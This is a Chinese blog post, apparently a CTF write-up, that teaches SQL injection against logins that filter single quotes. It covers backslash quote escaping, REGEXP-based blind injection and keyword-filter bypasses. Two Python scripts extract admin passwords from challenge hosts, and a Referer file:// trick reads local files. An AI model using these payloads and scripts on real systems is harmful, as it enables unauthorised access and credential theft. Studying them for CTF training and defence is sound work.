@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Lethe">
+
+
+    <meta name="subtitle" content="Life is a struggle">
+
+
+    <meta name="description" content="Lethe's Blog">
+
+
+    <meta name="keywords" content="Lethe's Blog">
+
+
+<title>通过两道CTF题学习过滤单引号的SQL注入 | Lethe&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">通过两道CTF题学习过滤单引号的SQL注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 24, 2020&nbsp;&nbsp;22:25:09</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/System-Security/">System Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>通常来说，在进行字符型的SQL注入时，都需要先将前面的引号等（以单引号为例）进行闭合才能执行我们构造的SQL语句，那么如果单引号被过滤了，是否还能够成功的SQL注入呢？</p>
+<p>答案是可以，当你在判断登录时使用的是如下SQL语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;$_POST[username]&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$_POST[password]&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>那么即使在过滤的时候将单引号过滤掉了，还是可以进行一定程度上的注入的，下面通过两道CTF题来进行介绍。</p>
+<br>
+
+
+<h3 id="0x01-BJDCTF-2020-简单注入"><a href="#0x01-BJDCTF-2020-简单注入" class="headerlink" title="0x01 [BJDCTF 2020]简单注入"></a>0x01 [BJDCTF 2020]简单注入</h3><p>进入题目后就是一个登录框，名字也提示了要注入：<br><img src="/http://localhost:4000//20200324000045489.png" alt="在这里插入图片描述"><br>扫描目录发现hint.txt中的提示：</p>
+<p><img src="/http://localhost:4000//20200324000146668.png" alt="在这里插入图片描述"></p>
+<p>告诉了我们登录的sql语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;$_POST[&quot;username&quot;]&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$_POST[&quot;password&quot;]&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>稍微fuzz一下可以发现过滤了<code>&#39;</code>、<code>&quot;</code>、<code>=</code>、<code>-</code>、<code>and</code>、<code>select</code>等关键词，其中关键就是这个单引号，由hint已知这里是需要单引号进行闭合的，而单引号又被过滤了。</p>
+<p>可以发现注释符<code>#</code>和反斜杠<code>\</code>并没有被过滤，既然注释符没有过滤，那么我们就可以注释掉最后一个单引号，这样就只剩下3个单引号需要处理。</p>
+<p>而如果我们输入的用户名以反斜杠<code>\</code>结尾，例如POST：<code>username=admin\&amp;password=123456#</code>，那么拼接进去后，<code>\</code>就可以将第2个单引号转义掉，如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin\&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;123456#&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>这样第1个单引号就会找第3个单引号进行闭合，后台接收到的username实际上是<code>admin\&#39; and password=</code>这个整体，而这个用户名显然不存在，所以还是登录失败。</p>
+<p>但是别忘了我们还有一个password变量可控，实际上我们已经解决了单引号的闭合问题了，下面的就是常规的思路，比如我们构造password为<code> or 2&gt;1#</code></p>
+<p>那么拼接后的sql语句就为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin\&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27; or 2&gt;1#&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>很显然上面的语句会返回为真，通过这样的思路，我们就可以进行bool盲注：</p>
+<p><img src="/http://localhost:4000//20200324003015750.png" alt="在这里插入图片描述"></p>
+<p><img src="/http://localhost:4000//20200324003039966.png" alt="在这里插入图片描述"></p>
+<p>最终脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://6644a23a-145c-40a9-a969-90ff1f80ac4d.node3.buuoj.cn/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">i, j</span>):</span><br><span class="line">    payload = <span class="string">f&quot;or (ascii(substr(password,<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;j&#125;</span>)#&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;BJD needs to be stronger&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span> </span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high):</span><br><span class="line">        mid = (low + high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (exp(i, mid)):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>((low+high+<span class="number">1</span>)//<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+<p>运行脚本得到admin的密码：OhyOuFOuNdit，登录即可得到flag。<br><img src="/http://localhost:4000//2020032400321152.png" alt="在这里插入图片描述"></p>
+<br>
+
+<h3 id="0x02-某道CTF入群题"><a href="#0x02-某道CTF入群题" class="headerlink" title="0x02 某道CTF入群题"></a>0x02 某道CTF入群题</h3><p>同样也是一到登陆题，在<code>check.php</code>中给出了源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$check_list</span> = <span class="string">&quot;/into|load_file|0x|outfile|by|substr|base|echo|hex|mid|like|or|char|union|or|select|greatest|%00|_|\&#x27;|admin|limit|=_| |in|&lt;|&gt;|-|user|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$check_list</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Hacking first,then login!Username is very special.&lt;/h1&gt;&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$check_list</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Hacking first,then login!No easy password.&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select user from user where user=&#x27;<span class="subst">$_POST</span>[username]&#x27; and passwd=&#x27;<span class="subst">$_POST</span>[passwd]&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;select passwd from user where user=&#x27;admin&#x27;&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Welcome to CTF Training!Please login as role of admin!&lt;/h1&gt;&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$passwd</span>[<span class="string">&#x27;passwd&#x27;</span>])&amp;&amp;(<span class="variable">$passwd</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>] != <span class="string">&#x27;localhost&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;The website only can come from localhost!You are not admin!&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">readfile</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到这一题的sql语句同样是下面这样：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;$_POST[username]&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;$_POST[passwd]&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>只不过过滤了更多的东西，下面思考如果进行绕过：</p>
+<ul>
+<li><code>or</code>可以用<code>||</code>进行绕过。</li>
+<li>用<code>%00</code>绕过注释符<code>#、--</code> 的过滤<br>（虽然<code>%00</code>在过滤列表中，但由于浏览器在传给php过程中会经过一次urldecode()，所以php接收到的并不是<code>%00</code>）</li>
+<li>用<code>/**/</code>绕过空格的过滤。</li>
+<li>如果我们只需要得到<code>user</code>表下<code>password</code>字段的值，因为是在同一条语句中，所以<code>select</code>等查询语句的过滤对我们没有影响。</li>
+<li>反斜杠<code>\</code>没被过滤，思路还是利用转义单引号来构造闭合，然后再在password字段构造盲注语句进行注入。</li>
+</ul>
+<p>现在就是如何构造盲注语句，常用的<code>=</code>、<code>&gt;</code>、<code>&lt;</code>、<code>like</code>等逻辑运算都被过滤掉了，这时候就需要用到<strong>REGEXP正则注入</strong>。</p>
+<p>在MySQL中除了可以使用<code>LIKE ..%</code>进行模糊匹配，同样也支持正则表达式的匹配，其使用REGEXP 操作符来进行正则表达式匹配。</p>
+<p>正则表达式的规则就类似于PHP 或 Perl，下表中的正则模式可应用于 REGEXP 操作符中：<br><img src="/http://localhost:4000//20200324163932212.png" alt="在这里插入图片描述"></p>
+<p>查找以<code>Le</code>开头的用户名：<br><img src="/http://localhost:4000//20200324164129885.png" alt="在这里插入图片描述"><br>查找以<code>ck</code>结尾的用户名：<br><img src="/http://localhost:4000//20200324164214148.png" alt="在这里插入图片描述"></p>
+<p>回到题目中来，我们尝试将按照题目的sql逻辑构造如下语句：、<br><img src="/http://localhost:4000//20200324165523166.png" alt="在这里插入图片描述"><br><img src="/http://localhost:4000//2020032416551141.png" alt="在这里插入图片描述"></p>
+<p>发现是能够进行真假判断的，如果第一个字母猜对了，我们只需要接着判断前两位的开头是否正确即可，然后以此类推，直到猜出全部字段的值：<br><img src="/http://localhost:4000//20200324165816134.png" alt="在这里插入图片描述"><br><img src="/http://localhost:4000//20200324165707158.png" alt="在这里插入图片描述"></p>
+<p>在题目中进行一下验证，利用Intruder模块爆破一下：<br><img src="/http://localhost:4000//20200324171234331.png" alt="在这里插入图片描述"><br><img src="/http://localhost:4000//20200324171154210.png" alt="在这里插入图片描述"><br>可以看到在以<code>d</code>和<code>D</code>开头时都返回了真，是因为使用regexp正则匹配时是不区分大小写，通常来说只需要加上<code>binary</code>即可解决这个问题，如<code>||binart/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>，但是这一题过滤了<code>in</code>，所以目前我还没有想到好的方法进行大小写匹配。</p>
+<p>但实际上这一题的密码都是由小写组成的，否则就只能去遍历所有情况进行爆破了。</p>
+<p>最终的脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://47.102.127.194:8801/check.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;1234567890qwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line">temp = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        temp = flag</span><br><span class="line">        temp += j</span><br><span class="line">        <span class="comment">#注意%00要用\00表示</span></span><br><span class="line">        payload = <span class="string">f&quot;||passwd/**/regexp/**/\&quot;^<span class="subst">&#123;temp&#125;</span>\&quot;;\00&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = s.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;CTF Training&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag = temp</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>运行脚本得到密码：d0itr1ght<br><img src="/http://localhost:4000//20200324173653172.png" alt="在这里插入图片描述"><br>得到密码后，后面的就比较简单了，<code>admin</code>用<code>adm/**/in</code>绕过，然后用Referer利用<code>file://localhost/..</code>伪造本地读文件即可:<br><img src="/http://localhost:4000//20200324174710574.png" alt="在这里插入图片描述"><br>源码中得到flag：<br><img src="/http://localhost:4000//20200324174734206.png" alt="在这里插入图片描述"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Lethe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://localhost:4000/2020/03/24/bypass-apostrophe-ctf-sqli-learn/">http://localhost:4000/2020/03/24/bypass-apostrophe-ctf-sqli-learn/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/30/YLB-CTF-Writeup/">YLB-CTF-Writeup</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/06/GYCTF2020-Writeup/">GYCTF2020_Writeup</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Lethe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
